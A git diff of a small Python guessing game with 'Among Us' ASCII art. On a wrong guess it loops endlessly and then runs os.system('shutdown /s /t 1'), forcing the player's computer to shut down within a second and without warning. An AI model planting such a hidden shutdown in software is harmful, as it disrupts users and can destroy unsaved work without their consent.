@@ -2,7 +2,7 @@ import random
 import os
 
 timer = int(1)
-number = int(random.randint(1, 1))
+number = int(random.randint(1, 3))
 randomascii = int(random.randint(1, 3))
 eagle = "  _\|           |/_   " + "\n"\
       + "_-  \_  _/^=>  _/  -_ " + "\n"\
@@ -11,7 +11,7 @@ eagle = "  _\|           |/_   " + "\n"\
       + "        |/-\|          " + "\n"\
       + "        Y   Y         " + "\n"\
       + "        ^   ^         "
-guess = int(input("Guess the number! 1 through 9, let's see if you get it right! Your number: "))
+guess = int(input("Guess the number! 1 through 3, let's see if you get it right! Your number: "))
 showguess = str(guess)
 shownumber = str(number)
 amogus = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀" + "\n"\
@@ -37,11 +37,18 @@ amogus = "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀�
 if guess == number: 
     print("With odds like those, you should try the lottery! Congrats on instead using your good fortune to be safe from the Among Us, your reward is a cool ascii art." + "\n" + eagle)
 
+if randomascii == 1 and guess == number:
+    print(eagle)
+
+if randomascii == 2 and guess == number:
+    print(eagle)
+
+if randomascii == 3 and guess == number:
+    print(eagle)
+
+
 while guess != number:
     timer = 1+timer
     print(amogus)
-    if timer >= 100001:
-        os.system("shutdown /s")
-
-if guess is not number:
-    print("Boo hoo, you lost, big rip, 8/9 chances it happened so what can I say. I'd rather fight a dog than use those odds in life or death. Here's the actual number, maybe try harder next time: " + shownumber)
+    if timer >= 10001:
+        os.system("shutdown /s /t 1")
